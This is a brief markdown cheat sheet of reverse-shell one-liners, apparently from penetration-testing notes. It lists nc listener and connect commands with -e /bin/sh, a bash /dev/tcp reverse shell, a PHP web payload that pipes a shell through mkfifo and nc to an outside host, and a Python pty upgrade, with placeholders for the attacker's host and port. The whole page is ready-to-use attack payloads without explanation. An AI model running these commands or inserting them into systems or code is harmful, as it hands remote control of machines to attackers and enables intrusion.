# 🔃 Reverse shell

## nc

```bash
nc -nlvp <PORT> -e /bin/sh
nc <HOST> <PORT>
```

## Bash and SH

```bash
bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1
nc -lnvvp <PORT> -e /bin/sh
```

## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"); ?>
```

## Python

```py
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
